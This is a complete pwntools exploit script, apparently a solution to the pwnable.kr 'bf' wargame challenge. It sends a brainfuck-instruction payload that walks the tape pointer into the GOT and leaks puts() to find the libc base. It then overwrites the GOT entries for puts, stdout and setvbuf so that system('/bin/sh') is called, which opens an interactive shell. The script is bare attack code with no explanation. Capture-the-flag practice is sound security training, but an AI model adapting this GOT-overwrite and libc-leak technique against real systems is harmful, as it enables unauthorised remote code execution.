from pwn import *

r = remote("pwnable.kr", 9001)

tape = 0x804A0A0  # tape
main = 0x8048671  # main()
puts_got = 0x804A018  # GOT of puts()
stdout_got = 0x804A060  # GOT of stdout
setvbuf_got = 0x804A028  # GOT of setvbuf()

puts_offset = 0x5FCB0  # offset of puts() from libc base
system_offset = 0x3ADB0  # offset of system() from libc base
binsh_offset = 0x15BB2B  # offset of "/bin/sh" from libc base

# leak libc
payload = b"<" * (tape - puts_got)
payload += b".>.>.>."

# overwrite GOT of puts() with main+35
payload += b"<<<"
payload += b",>,>,>,"

# overwrite GOT of stdout with "/bin/sh"
payload += b"<<<"
payload += b">" * (stdout_got - puts_got)
payload += b",>,>,>,"

# overwrite GOT of setvbuf() with system()
payload += b"<<<"
payload += b"<" * (stdout_got - setvbuf_got)
payload += b",>,>,>,"

# call puts() => main+35
payload += b"["

r.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload)

# leak libc
puts = u32(r.recvn(4))  # puts()
libc = puts - puts_offset  # libc base
log.info("libc base: " + hex(libc))
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"

# overwrite GOT of puts() with main+35
r.send(p32(main + 35))

# overwrite GOT of stdout with "/bin/sh"
r.send(p32(binsh))

# overwrite GOT of setvbuf() with system()
r.send(p32(system))

r.interactive()
